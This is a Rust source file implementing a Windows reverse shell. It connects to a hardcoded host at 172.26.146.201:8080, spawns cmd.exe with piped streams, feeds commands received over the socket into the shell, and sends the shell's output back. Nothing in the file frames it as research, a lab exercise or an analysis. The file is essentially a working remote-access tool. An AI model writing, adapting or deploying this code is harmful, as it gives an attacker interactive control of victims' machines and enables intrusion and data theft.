#![allow(unused)]

#[macro_use]
extern crate lazy_static;

use std::process::ChildStdin;
use std::process::Command;

use std::io::Write;
use std::process::Stdio;
use std::str;
use std::io::{BufRead, BufReader, BufWriter};
use std::thread;
use std::time;
use std::io::Read;
use std::sync::{Arc, Mutex};
use std::io::{stdin,stdout};

use std::net::TcpStream;
use std::io::prelude::*;
use tokio::io::split;

struct TcpStructure {
    tStream : TcpStream,
    readStream : TcpStream
    
}

fn main() {

    
   let mut tcpstream = TcpStream::connect("172.26.146.201:8080").unwrap();
   let mut read = tcpstream.try_clone().unwrap();
   let mut good_struct = TcpStructure {tStream: tcpstream, readStream: read};
    
   good_struct.tStream.write("Test".as_bytes()); //tmp

  
    start_process(good_struct);
}

/// Pipe streams are blocking, we need separate threads to monitor them without blocking the primary thread.
fn child_stream_to_vec<R>(mut stream: R) -> Arc<Mutex<Vec<u8>>>
where
    R: Read + Send + 'static,
{
    let out = Arc::new(Mutex::new(Vec::new()));
    let vec = out.clone();
    thread::Builder::new()
        .name("child_stream_to_vec".into())
        .spawn(move || loop {
        
            let mut buf = [0];
            match stream.read(&mut buf) {
                Err(err) => {
                    println!("{}] Error reading from stream: {}", line!(), err);
                    break;
                }
                Ok(got) => {
                    if got == 0 {
                        break;
                    } else if got == 1 {
                     
                    let mut t =  match  vec.lock() {
                            Ok(v) =>  v ,
                            Err(e) => { 
                                println!("Unable to get lock"); 
                                panic!();
                            }

                        };
                        t.push(buf[0]);
                    //     //.expect("!lock").push(buf[0])
                    } else {
                        println!("{}] Unexpected number of bytes: {}", line!(), got);
                        break;
                    }
                }
            }
        })
        .expect("!thread");
    out
}

fn get_input(mut stream: ChildStdin)
//where
//ChildStdin: Read + Send + 'static, 
{

    thread::Builder::new()
    .name("child_stream_to_vecy".into())
    .spawn(move || loop {
        let mut s=String::new();
        let _= stdout().flush();
        stdin().read_line(&mut s).expect("Did not enter a correct string");
        stream.write_all (&s.into_bytes());
        
    }

    ).expect( "!thread");

}

fn get_tcp_stream(mut xz : TcpStream,mut Stream: ChildStdin) {
   
    thread::Builder::new()
        .name("child_stream_read".into())
        .spawn(move || loop {
            let mut line;
            line = [0; 512];
            let result = xz.read(&mut line);

            match result {
                Ok(n) => { 
                    let s = String::from_utf8_lossy(&line);
                    Stream.write(&line[0..n]);
                    //Stream.write_all (&s.into_bytes());
                    //println!("Received {}",s);
                },
                _ => {}
            }
            
        }

        ).expect ("!tcpstreamLoop");

}



fn start_process(mut t_struct : TcpStructure) -> String {
     let mut output = Command::new("cmd.exe").stdout(Stdio::piped())
        .stdin(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();

     let ten_millis = time::Duration::from_millis(500);
     let now = time::Instant::now();
     
     thread::sleep(ten_millis);

     let out = child_stream_to_vec(output.stdout.take().expect("!stdout"));
     let err = child_stream_to_vec(output.stderr.take().expect("!stderr"));
     let mut stdin = match output.stdin.take() {
         Some(stdin) => stdin,
         None => panic!("!stdin")
     };
     
  
    get_tcp_stream(t_struct.readStream,stdin);

   

     loop {
        let mut out = out.lock().unwrap();
        let y = String::from_utf8(out.clone()).unwrap();
   
            t_struct.tStream.write(y.as_bytes());
            print!("{}",y);
    
      
       for n in 0..y.len() {
           out.remove(0);
       }

       std::mem::drop(out);
       std::io::stdout().flush();
 
     }
 

    return format!("{}","ok");
}